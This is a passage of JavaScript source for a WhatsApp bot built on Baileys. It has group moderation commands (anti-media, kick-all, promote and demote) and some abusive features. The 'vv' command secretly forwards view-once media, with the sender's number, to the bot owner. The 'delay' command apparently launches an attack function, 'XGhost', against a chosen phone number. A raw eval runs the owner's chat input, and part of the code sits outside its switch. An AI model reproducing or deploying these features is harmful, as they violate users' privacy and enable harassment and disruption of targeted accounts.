        return ReplySuccess('Anti-Sticker is now *REMOVE*\nStickers will be deleted and sender removed')
    } else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}

case 'antiimage':
case 'antiimg': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
        current.image = 'off'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Image is now *OFF*\nImages are allowed')
    } else if (subCmd === 'delete') {
        current.image = 'delete'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Image is now *DELETE*\nImages will be deleted')
    } else if (subCmd === 'remove') {
        current.image = 'remove'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Image is now *REMOVE*\nImages will be deleted and sender removed')
    } else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}

case 'antivideo':
case 'antivid': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
        current.video = 'off'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Video is now *OFF*\nVideos are allowed')
    } else if (subCmd === 'delete') {
        current.video = 'delete'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Video is now *DELETE*\nVideos will be deleted')
    } else if (subCmd === 'remove') {
        current.video = 'remove'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Video is now *REMOVE*\nVideos will be deleted and sender removed')
    } else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}

case 'antiaudio':
case 'antiaud': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
        current.audio = 'off'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Audio is now *OFF*\nAudios are allowed')
    } else if (subCmd === 'delete') {
        current.audio = 'delete'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Audio is now *DELETE*\nAudios will be deleted')
    } else if (subCmd === 'remove') {
        current.audio = 'remove'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Audio is now *REMOVE*\nAudios will be deleted and sender removed')
    } else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}

case 'antidocument':
case 'antidoc': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
        current.document = 'off'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Document is now *OFF*\nDocuments are allowed')
    } else if (subCmd === 'delete') {
        current.document = 'delete'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Document is now *DELETE*\nDocuments will be deleted')
    } else if (subCmd === 'remove') {
        current.document = 'remove'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Document is now *REMOVE*\nDocuments will be deleted and sender removed')
    } else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}

case 'anticontact':
case 'anticont': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
        current.contact = 'off'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Contact is now *OFF*\nContacts are allowed')
    } else if (subCmd === 'delete') {
        current.contact = 'delete'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Contact is now *DELETE*\nContacts will be deleted')
    } else if (subCmd === 'remove') {
        current.contact = 'remove'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Contact is now *REMOVE*\nContacts will be deleted and sender removed')
    } else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}

case 'antilocation':
case 'antiloc': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
        current.location = 'off'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Location is now *OFF*\nLocations are allowed')
    } else if (subCmd === 'delete') {
        current.location = 'delete'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Location is now *DELETE*\nLocations will be deleted')
    } else if (subCmd === 'remove') {
        current.location = 'remove'
        amGroups[from] = current
        saveAntiMedia(amGroups)
        return ReplySuccess('Anti-Location is now *REMOVE*\nLocations will be deleted and sender removed')
    } else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}

case 'antiall':
case 'antimediaall': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const subCmd = args[0]?.toLowerCase()
    const current = amGroups[from] || {}
    
    if (subCmd === 'off') {
    current.text = 'off'
    current.sticker = 'off'
    current.image = 'off'
    current.video = 'off'
    current.audio = 'off'
    current.document = 'off'
    current.contact = 'off'
    current.location = 'off'
    amGroups[from] = current
    saveAntiMedia(amGroups)
    return ReplySuccess('Anti-ALL Media is now *OFF*\nAll media types are allowed')
} else if (subCmd === 'delete') {
    current.text = 'delete'
    current.sticker = 'delete'
    current.image = 'delete'
    current.video = 'delete'
    current.audio = 'delete'
    current.document = 'delete'
    current.contact = 'delete'
    current.location = 'delete'
    amGroups[from] = current
    saveAntiMedia(amGroups)
    return ReplySuccess('Anti-ALL Media is now *DELETE*\nAll media types will be deleted')
} else if (subCmd === 'remove') {
    current.text = 'remove'
    current.sticker = 'remove'
    current.image = 'remove'
    current.video = 'remove'
    current.audio = 'remove'
    current.document = 'remove'
    current.contact = 'remove'
    current.location = 'remove'
    amGroups[from] = current
    saveAntiMedia(amGroups)
    return ReplySuccess('Anti-ALL Media is now *REMOVE*\nAll media types will be deleted and sender removed')
} else {
        return ReplyFailed(`Usage: ${command} off , delete , remove`)
    }
}

case 'antimedia':
case 'antimedialist': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    
    const amGroups = getAntiMedia()
    const settings = amGroups[from] || {}
    
const textMode = settings.text || 'off'
const stickerMode = settings.sticker || 'off'
const imageMode = settings.image || 'off'
const videoMode = settings.video || 'off'
const audioMode = settings.audio || 'off'
const documentMode = settings.document || 'off'
const contactMode = settings.contact || 'off'
const locationMode = settings.location || 'off'
    
    const modeEmoji = {
        'off': '✅ OFF',
        'delete': '🗑️ DELETE',
        'remove': '🚫 REMOVE'
    }
    
    const listText = 
    `*📋 ANTI-MEDIA SETTINGS*\n\n` +
    `💬 *Text*       : ${modeEmoji[textMode]}\n` +
    `🎨 *Sticker*    : ${modeEmoji[stickerMode]}\n` +
    `🖼️ *Image*      : ${modeEmoji[imageMode]}\n` +
    `🎥 *Video*      : ${modeEmoji[videoMode]}\n` +
    `🎵 *Audio*      : ${modeEmoji[audioMode]}\n` +
    `📄 *Document*   : ${modeEmoji[documentMode]}\n` +
    `👤 *Contact*    : ${modeEmoji[contactMode]}\n` +
    `📍 *Location*   : ${modeEmoji[locationMode]}\n\n` +
    `*Commands:*\n` +
    `• .antitext off/delete/remove\n` +
    `• .antisticker off/delete/remove\n` +
    `• .antiimage off/delete/remove\n` +
    `• .antivideo off/delete/remove\n` +
    `• .antiaudio off/delete/remove\n` +
    `• .antidocument off/delete/remove\n` +
    `• .anticontact off/delete/remove\n` +
    `• .antilocation off/delete/remove\n` +
    `• .antiall off/delete/remove`
    
    return ReplySuccess(listText)
}

case 'tagall':
case 'tag':
case 'everyone': {
    if (!isGroup) return ReplyFailed('This command can only be used in groups')
    if (!CreatorOnly) return ReplyFailed('Access Denied')

    let groupMeta
    try {
        groupMeta = await sock.groupMetadata(from)
    } catch {
        return ReplyFailed('Failed to fetch group metadata')
    }

    const participants = groupMeta.participants
    const customMsg = args.join(' ') || '💬 Hey everyone!'

    let mentions = []
    for (const p of participants) {
        const realJid = p.jid?.endsWith('@s.whatsapp.net') ? p.jid
            : p.id?.endsWith('@s.whatsapp.net') ? p.id
            : p.pn ? `${p.pn}@s.whatsapp.net`
            : null
        if (realJid) mentions.push(realJid)
    }

    const mentionText = mentions.map(jid => `@${jid.split('@')[0]}`).join(' ')

    const tagText = 
        `╭─────────────────╮\n` +
        `│ 📢 *Tag All*\n` +
        `│ 👥 Group: ${groupMeta.subject}\n` +
        `│ 👤 By: ${pushname}\n` +
        `│ ⏰ Time: ${time}\n` +
        `│ 📅 Date: ${todayDate}\n` +
        `╰─────────────────╯\n\n` +
        `💬 *Message:* ${customMsg}\n\n` +
        `${mentionText}`

    await sock.sendMessage(from, {
        text: tagText,
        mentions: mentions
    }, { quoted: m })

    break
}

case 'kick':
case 'remove': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')

    let groupMeta
    try {
        groupMeta = await sock.groupMetadata(from)
    } catch {
        return ReplyFailed('Failed to fetch group metadata')
    }

    const botIsAdmin = groupMeta.participants.some(
        p => (p.id === BotNum || p.jid === BotNum) && (p.admin === 'admin' || p.admin === 'superadmin')
    )
    if (!botIsAdmin) return ReplyFailed('Make the bot an admin first')

    let targets = []

    const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || []
    if (mentioned.length) targets = [...mentioned]

    if (args.length) {
        for (const arg of args) {
            const num = arg.replace(/[^0-9]/g, '')
            if (num.length >= 7) {
                const jid = num + '@s.whatsapp.net'
                if (!targets.includes(jid)) targets.push(jid)
            }
        }
    }

    if (!targets.length) {
        const quotedParticipant = m.message?.extendedTextMessage?.contextInfo?.participant
        if (quotedParticipant) {
            targets.push(quotedParticipant)
        }
    }

    if (!targets.length) {
        return ReplyFailed(
            `Example:\n` +
            `kick 923xxxxxxxxx`
        )
    }

    let success = []
    let failed = []

    for (const target of targets) {
        const num = target.split('@')[0]

        if (target === BotNum) {
            failed.push(`${num} (Bot)`)
            continue
        }

        const user = groupMeta.participants.find(p => p.id === target || p.jid === target)
        if (user?.admin === 'superadmin') {
            failed.push(`${num} (Owner)`)
            continue
        }

        try {
            await sock.groupParticipantsUpdate(from, [target], 'remove')
            success.push(num)
        } catch {
            failed.push(`${num} (Error)`)
        }
    }

    let text = `🦵 *KICK REPORT*\n\n`
    text += `👥 Group: ${groupMeta.subject}\n`
    text += `👮 Admin: ${pushname}\n`
    text += `⏰ Time: ${time}\n`
    text += `📅 Date: ${todayDate}\n\n`

    if (success.length)
        text += `✅ Removed:\n${success.map(n => `• ${n}`).join('\n')}\n`

    if (failed.length)
        text += `\n❌ Failed:\n${failed.map(n => `• ${n}`).join('\n')}`

    return ReplySuccess(text)
}

case 'kickall':
case 'removeall': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')

    let groupMeta
    try {
        groupMeta = await sock.groupMetadata(from)
    } catch {
        return ReplyFailed('Failed to fetch group metadata')
    }

    const botIsAdmin = groupMeta.participants.some(
        p => (p.id === BotNum || p.jid === BotNum) && (p.admin === 'admin' || p.admin === 'superadmin')
    )
    if (!botIsAdmin) return ReplyFailed('Make the bot an admin first')

    const senderIsSuperAdmin = groupMeta.participants.some(
        p => (p.id === sender || p.jid === sender) && p.admin === 'superadmin'
    )
    
    if (!senderIsSuperAdmin && !Owner.includes(sender.split('@')[0])) {
        return ReplyFailed('Only group superadmin or bot owner can use this command')
    }

    const participants = groupMeta.participants
    const targets = []
    let superAdminCount = 0
    
    for (const p of participants) {
        const jid = p.id || p.jid
        const isBot = jid === BotNum
        const isSuperAdmin = p.admin === 'superadmin'
        
        if (isSuperAdmin) {
            superAdminCount++
        }
        
        if (!isBot && !isSuperAdmin) {
            targets.push(jid)
        }
    }

    if (targets.length === 0) {
        return ReplyFailed('No members to kick. Only bot and superadmins remain.')
    }

    await sock.sendMessage(from, { 
        react: { text: '🌸', key: m.key } }, { quoted: eseQuoted() })

    let success = []
    let failed = []
    const total = targets.length
    let current = 0

    for (const target of targets) {
        current++
        const num = target.split('@')[0]
        
        try {
            await sock.groupParticipantsUpdate(from, [target], 'remove')
            success.push(num)
            
            if (current % 5 === 0) {
                await new Promise(resolve => setTimeout(resolve, 100))
            }
        } catch (err) {
            failed.push(`${num} (${err.message?.slice(0, 20) || 'Error'})`)
        }
    }

    const text = `🦵 *KICK ALL REPORT*\n\n` +
        `👥 Group: ${groupMeta.subject}\n` +
        `👮 Admin: ${pushname}\n` +
        `⏰ Time: ${time}\n` +
        `📅 Date: ${todayDate}\n\n` +
        `✅ Kicked: ${success.length}\n` +
        `❌ Failed: ${failed.length}\n\n` +
        `👑 Superadmins kept: ${superAdminCount}`

    if (failed.length > 0 && failed.length <= 10) {
        return ReplySuccess(text + `\n\n❌ Failed List:\n${failed.map(n => `• ${n}`).join('\n')}`)
    }
    
    return ReplySuccess(text)
}

case 'add':
case 'join':
case 'invite': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')

    let groupMeta
    try {
        groupMeta = await sock.groupMetadata(from)
    } catch {
        return ReplyFailed('Failed to fetch group metadata')
    }

    const botIsAdmin = groupMeta.participants.some(
        p => (p.id === BotNum || p.jid === BotNum) && (p.admin === 'admin' || p.admin === 'superadmin')
    )
    if (!botIsAdmin) return ReplyFailed('Make the bot an admin first')

    let targets = []

    const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || []
    if (mentioned.length) targets = [...mentioned]

    if (args.length) {
        for (const arg of args) {
            const num = arg.replace(/[^0-9]/g, '')
            if (num.length >= 7) {
                const jid = num + '@s.whatsapp.net'
                if (!targets.includes(jid)) targets.push(jid)
            }
        }
    }

    if (!targets.length) {
        const quotedParticipant = m.message?.extendedTextMessage?.contextInfo?.participant
        if (quotedParticipant) {
            targets.push(quotedParticipant)
        }
    }

    if (!targets.length) {
        return ReplyFailed(
            `Example:\n` +
            `add 923xxxxxxxxx\n` +
            `Or reply to a user's message with add`
        )
    }

    let success = []
    let failed = []
    let alreadyInGroup = []

    for (const target of targets) {
        const num = target.split('@')[0]

        if (target === BotNum) {
            failed.push(`${num} (Bot)`)
            continue
        }

        const userExists = groupMeta.participants.some(p => p.id === target || p.jid === target)
        if (userExists) {
            alreadyInGroup.push(num)
            continue
        }

        try {
            await sock.groupParticipantsUpdate(from, [target], 'add')
            success.push(num)
        } catch (err) {
            failed.push(`${num} (Error)`)
        }
    }

    let text = `👥 *ADD MEMBER REPORT*\n\n`
    text += `👥 Group: ${groupMeta.subject}\n`
    text += `👮 Admin: ${pushname}\n`
    text += `⏰ Time: ${time}\n`
    text += `📅 Date: ${todayDate}\n\n`

    if (success.length)
        text += `✅ Added:\n${success.map(n => `• ${n}`).join('\n')}\n`

    if (alreadyInGroup.length)
        text += `\n⚠️ Already in Group:\n${alreadyInGroup.map(n => `• ${n}`).join('\n')}\n`

    if (failed.length)
        text += `\n❌ Failed:\n${failed.map(n => `• ${n}`).join('\n')}`

    return ReplySuccess(text)
}

case 'promote':
case 'admin': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')

    let groupMeta
    try {
        groupMeta = await sock.groupMetadata(from)
    } catch {
        return ReplyFailed('Failed to fetch group metadata')
    }

    const botIsAdmin = groupMeta.participants.some(
        p => (p.id === BotNum || p.jid === BotNum) && (p.admin === 'admin' || p.admin === 'superadmin')
    )
    if (!botIsAdmin) return ReplyFailed('Make the bot an admin first')

    let targets = []

    const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || []
    if (mentioned.length) targets = [...mentioned]

    if (args.length) {
        for (const arg of args) {
            const num = arg.replace(/[^0-9]/g, '')
            if (num.length >= 7) {
                const jid = num + '@s.whatsapp.net'
                if (!targets.includes(jid)) targets.push(jid)
            }
        }
    }

    if (!targets.length) {
        const quotedParticipant = m.message?.extendedTextMessage?.contextInfo?.participant
        if (quotedParticipant) {
            targets.push(quotedParticipant)
        }
    }

    if (!targets.length) {
        return ReplyFailed(
            `Example:\n` +
            `promote 923xxxxxxxxx\n` +
            `Or reply to a user's message with promote`
        )
    }

    let success = []
    let failed = []
    let alreadyAdmin = []

    for (const target of targets) {
        const num = target.split('@')[0]

        if (target === BotNum) {
            failed.push(`${num} (Bot)`)
            continue
        }

        const user = groupMeta.participants.find(p => p.id === target || p.jid === target)
        if (!user) {
            failed.push(`${num} (Not in group)`)
            continue
        }

        if (user.admin === 'admin' || user.admin === 'superadmin') {
            alreadyAdmin.push(num)
            continue
        }

        try {
            await sock.groupParticipantsUpdate(from, [target], 'promote')
            success.push(num)
        } catch (err) {
            failed.push(`${num} (Error)`)
        }
    }

    let text = `⬆️ *PROMOTE REPORT*\n\n`
    text += `👥 Group: ${groupMeta.subject}\n`
    text += `👮 Admin: ${pushname}\n`
    text += `⏰ Time: ${time}\n`
    text += `📅 Date: ${todayDate}\n\n`

    if (success.length)
        text += `✅ Promoted:\n${success.map(n => `• ${n}`).join('\n')}\n`

    if (alreadyAdmin.length)
        text += `\n⚠️ Already Admin:\n${alreadyAdmin.map(n => `• ${n}`).join('\n')}\n`

    if (failed.length)
        text += `\n❌ Failed:\n${failed.map(n => `• ${n}`).join('\n')}`

    return ReplySuccess(text)
}

case 'demote':
case 'unadmin': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')

    let groupMeta
    try {
        groupMeta = await sock.groupMetadata(from)
    } catch {
        return ReplyFailed('Failed to fetch group metadata')
    }

    const botIsAdmin = groupMeta.participants.some(
        p => (p.id === BotNum || p.jid === BotNum) && (p.admin === 'admin' || p.admin === 'superadmin')
    )
    if (!botIsAdmin) return ReplyFailed('Make the bot an admin first')

    let targets = []

    const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || []
    if (mentioned.length) targets = [...mentioned]

    if (args.length) {
        for (const arg of args) {
            const num = arg.replace(/[^0-9]/g, '')
            if (num.length >= 7) {
                const jid = num + '@s.whatsapp.net'
                if (!targets.includes(jid)) targets.push(jid)
            }
        }
    }

    if (!targets.length) {
        const quotedParticipant = m.message?.extendedTextMessage?.contextInfo?.participant
        if (quotedParticipant) {
            targets.push(quotedParticipant)
        }
    }

    if (!targets.length) {
        return ReplyFailed(
            `Example:\n` +
            `demote 923xxxxxxxxx\n` +
            `Or reply to a user's message with demote`
        )
    }

    let success = []
    let failed = []
    let notAdmin = []

    for (const target of targets) {
        const num = target.split('@')[0]

        if (target === BotNum) {
            failed.push(`${num} (Bot)`)
            continue
        }

        const user = groupMeta.participants.find(p => p.id === target || p.jid === target)
        if (!user) {
            failed.push(`${num} (Not in group)`)
            continue
        }

        if (!user.admin || user.admin === '') {
            notAdmin.push(num)
            continue
        }

        try {
            await sock.groupParticipantsUpdate(from, [target], 'demote')
            success.push(num)
        } catch (err) {
            failed.push(`${num} (Error)`)
        }
    }

    let text = `⬇️ *DEMOTE REPORT*\n\n`
    text += `👥 Group: ${groupMeta.subject}\n`
    text += `👮 Admin: ${pushname}\n`
    text += `⏰ Time: ${time}\n`
    text += `📅 Date: ${todayDate}\n\n`

    if (success.length)
        text += `✅ Demoted:\n${success.map(n => `• ${n}`).join('\n')}\n`

    if (notAdmin.length)
        text += `\n⚠️ Not Admin:\n${notAdmin.map(n => `• ${n}`).join('\n')}\n`

    if (failed.length)
        text += `\n❌ Failed:\n${failed.map(n => `• ${n}`).join('\n')}`

    return ReplySuccess(text)
}

case 'allpromote':
case 'promoteall': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')

    let groupMeta
    try {
        groupMeta = await sock.groupMetadata(from)
    } catch {
        return ReplyFailed('Failed to fetch group metadata')
    }

    const botIsAdmin = groupMeta.participants.some(
        p => (p.id === BotNum || p.jid === BotNum) && (p.admin === 'admin' || p.admin === 'superadmin')
    )
    if (!botIsAdmin) return ReplyFailed('Make the bot an admin first')
    const participants = groupMeta.participants
    const targets = []
    
    for (const p of participants) {
        const jid = p.id || p.jid
        const isBot = jid === BotNum
        const isAlreadyAdmin = p.admin === 'admin' || p.admin === 'superadmin'
        
        if (!isBot && !isAlreadyAdmin) {
            targets.push(jid)
        }
    }

    if (targets.length === 0) {
        return ReplyFailed('No members to promote. Everyone is already an admin or only bot is present.')
    }

    await sock.sendMessage(from, { 
        react: { text: '🌸', key: m.key } }, { quoted: eseQuoted() })

    let success = []
    let failed = []
    const total = targets.length
    let current = 0

    for (const target of targets) {
        current++
        const num = target.split('@')[0]
        
        try {
            await sock.groupParticipantsUpdate(from, [target], 'promote')
            success.push(num)
        } catch (err) {
            failed.push(`${num} (${err.message?.slice(0, 20) || 'Error'})`)
        }
    }

    const text = `⬆️ *ALL PROMOTE REPORT*\n\n` +
        `👥 Group: ${groupMeta.subject}\n` +
        `👮 Admin: ${pushname}\n` +
        `⏰ Time: ${time}\n` +
        `📅 Date: ${todayDate}\n\n` +
        `📊 Total: ${total} members\n` +
        `✅ Success: ${success.length}\n` +
        `❌ Failed: ${failed.length}`

    return ReplySuccess(text)
}

case 'alldemote':
case 'demoteall': {
    if (!CreatorOnly) return ReplyFailed('Access Denied')
    if (!isGroup) return ReplyFailed('This command can only be used in groups')

    let groupMeta
    try {
        groupMeta = await sock.groupMetadata(from)
    } catch {
        return ReplyFailed('Failed to fetch group metadata')
    }

    const botIsAdmin = groupMeta.participants.some(
        p => (p.id === BotNum || p.jid === BotNum) && (p.admin === 'admin' || p.admin === 'superadmin')
    )
    if (!botIsAdmin) return ReplyFailed('Make the bot an admin first')
    const participants = groupMeta.participants
    const targets = []
    let superAdminCount = 0
    
    for (const p of participants) {
        const jid = p.id || p.jid
        const isBot = jid === BotNum
        const isSuperAdmin = p.admin === 'superadmin'
        
        if (isSuperAdmin) {
            superAdminCount++
        }
        if (!isBot && (p.admin === 'admin')) {
            targets.push(jid)
        }
    }

    if (targets.length === 0) {
        return ReplyFailed('No admins to demote. Only superadmins or bot are admins.')
    }

    if (superAdminCount === 0 && targets.length === participants.length - 1) {
        return ReplyFailed('Cannot demote all admins. At least one admin (superadmin) must remain.')
    }

    await sock.sendMessage(from, { 
        react: { text: '🌸', key: m.key } }, { quoted: eseQuoted() })

    let success = []
    let failed = []
    const total = targets.length
    let current = 0

    for (const target of targets) {
        current++
        const num = target.split('@')[0]
        
        try {
            await sock.groupParticipantsUpdate(from, [target], 'demote')
            success.push(num)
        } catch (err) {
            failed.push(`${num} (${err.message?.slice(0, 20) || 'Error'})`)
        }
    }

    const text = `⬇️ *ALL DEMOTE REPORT*\n\n` +
        `👥 Group: ${groupMeta.subject}\n` +
        `👮 Admin: ${pushname}\n` +
        `⏰ Time: ${time}\n` +
        `📅 Date: ${todayDate}\n\n` +
        `📊 Total Admins: ${total}\n` +
        `✅ Demoted: ${success.length}\n` +
        `❌ Failed: ${failed.length}\n\n` +
        `👑 Superadmins in group: ${superAdminCount}`

    return ReplySuccess(text)
}

            case 'vv':
            case 'wow':
            case 'open': {
                const ctx = m.message?.extendedTextMessage?.contextInfo
                const quoted = ctx.quotedMessage
                let innerMsg = null
                let innerType = null

                if (quoted.viewOnceMessage?.message) {
                    const inner = quoted.viewOnceMessage.message
                    innerType = Object.keys(inner)[0]
                    innerMsg = inner[innerType]
                } else if (quoted.viewOnceMessageV2?.message) {
                    const inner = quoted.viewOnceMessageV2.message
                    innerType = Object.keys(inner)[0]
                    innerMsg = inner[innerType]
                } else if (quoted.viewOnceMessageV2Extension?.message) {
                    const inner = quoted.viewOnceMessageV2Extension.message
                    innerType = Object.keys(inner)[0]
                    innerMsg = inner[innerType]
                } else if (quoted.imageMessage) {
                    innerType = 'imageMessage'
                    innerMsg = quoted.imageMessage
                } else if (quoted.videoMessage) {
                    innerType = 'videoMessage'
                    innerMsg = quoted.videoMessage
                }

                if (!innerMsg || !innerType) return ReplyFailed('The replied message is not a view-once message.')

                await sock.sendMessage(from, { react: { text: '👁️', key: m.key } })
                const sendTo = BotNum

                const sourceInfo = isGroup
                    ? `👥 *Source   :* Group\n` +
                    `📛 *Group    :* ${m.groupMetadata?.subject || (await sock.groupMetadata(from).catch(() => ({ subject: 'Unknown' })))?.subject}\n` +
                    `🆔 *Group ID :* ${from}\n` +
                    `👤 *Sender   :* ${pushname}\n` +
                    `📞 *Number   :* ${sender.split('@')[0]}`
                    : `💬 *Source   :* Private Chat\n` +
                    `👤 *Name     :* ${pushname}\n` +
                    `📞 *Number   :* ${sender.split('@')[0]}`

                const caption = innerMsg.caption
                    ? `📩 *View-Once Revealed*\n\n${sourceInfo}\n⏰ *Time     :* ${time}\n📅 *Date     :* ${todayDate}\n\n📝 *Caption  :* ${innerMsg.caption}`
                    : `📩 *View-Once Revealed*\n\n${sourceInfo}\n⏰ *Time     :* ${time}\n📅 *Date     :* ${todayDate}`

                try {
                    const { downloadMediaMessage } = require('@whiskeysockets/baileys')
                    const fakeMsg = {
                        key: {
                            remoteJid: from,
                            id: ctx.stanzaId,                            fromMe: false,
                            participant: ctx.participant
                        },
                        message: quoted
                    }

                    const buffer = await downloadMediaMessage(fakeMsg, 'buffer', {})

                    if (innerType === 'imageMessage') {
                        await sock.sendMessage(sendTo, {
                            image: buffer,
                            caption }, { quoted: eseQuoted() })
                    } else if (innerType === 'videoMessage') {
                        await sock.sendMessage(sendTo, {
                            video: buffer,
                            caption,
                            mimetype: innerMsg.mimetype || 'video/mp4' }, { quoted: eseQuoted() })
                    } else if (innerType === 'audioMessage') {
                        await sock.sendMessage(sendTo, {
                            audio: buffer,
                            mimetype: innerMsg.mimetype || 'audio/mp4',
                            ptt: innerMsg.ptt || false }, { quoted: eseQuoted() })
                    } else {
                        await sock.sendMessage(sendTo, {
                            document: buffer,
                            mimetype: innerMsg.mimetype || 'application/octet-stream',
                            fileName: innerMsg.fileName || 'file',
                            caption }, { quoted: eseQuoted() })
                    }

                } catch (e) {
                    return ReplyFailed(`Failed to reveal: ${e.message}`)
                }

                break
            }
        }


              case 'delay': {
                  if (!CreatorOnly) return reply('❌ Only the owner can use this command')
                  if (!args.length && !m.message?.extendedTextMessage?.contextInfo?.participant) return reply('❗ Example: .delay 2547xxxxxxxxx or reply to a user')

                  let target = args[0]
                  if (m.message?.extendedTextMessage?.contextInfo?.participant) {
                      target = m.message.extendedTextMessage.contextInfo.participant
                  } else {
                      target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                  }

                  const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys')

                  const delayMsg = await generateWAMessageFromContent(from, {
                      viewOnceMessage: {
                          message: {
                              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                  body: proto.Message.InteractiveMessage.Body.fromObject({
                                      text: `🎯 Target:\n${target}\n\n`
                                  }),
                                  footer: proto.Message.InteractiveMessage.Footer.fromObject({
                                      text: global.botName
                                  }),
                                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                      buttons: [
                                          {
                                              name: 'quick_reply',
                                              buttonParamsJson: JSON.stringify({ display_text: '🔁 Start', id: `delay ${target}` })
                                          },
                                          {
                                              name: 'quick_reply',
                                              buttonParamsJson: JSON.stringify({ display_text: '🛑 Stop', id: 'stopdelay' })
                                          },
                                          {
                                              name: 'cta_copy',
                                              buttonParamsJson: JSON.stringify({ display_text: '📋 Copy Target', copy_code: target })
                                          }
                                      ]
                                  })
                              })
                          }
                      }
                  }, { quoted: m })

                  await sock.relayMessage(from, delayMsg.message, { messageId: delayMsg.key.id })
                  XGhost(sock, target)
                  break
              }

          if (body.startsWith('>') && CreatorOnly) {
            try {
                const evaled = await eval(body.slice(2))
                ReplySuccess(util.inspect(evaled))
            } catch (e) {
                ReplyFailed(String(e))
            }
        }    } catch (err) {
        console.error(err)
    }
}

module.exports.handleAntiDelete = handleAntiDelete
module.exports.handleGroupUpdates = handleGroupUpdates
module.exports.handleAntiMedia = handleAntiMedia
module.exports.msgCache = msgCache

const file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    delete require.cache[file]
    require(file)
})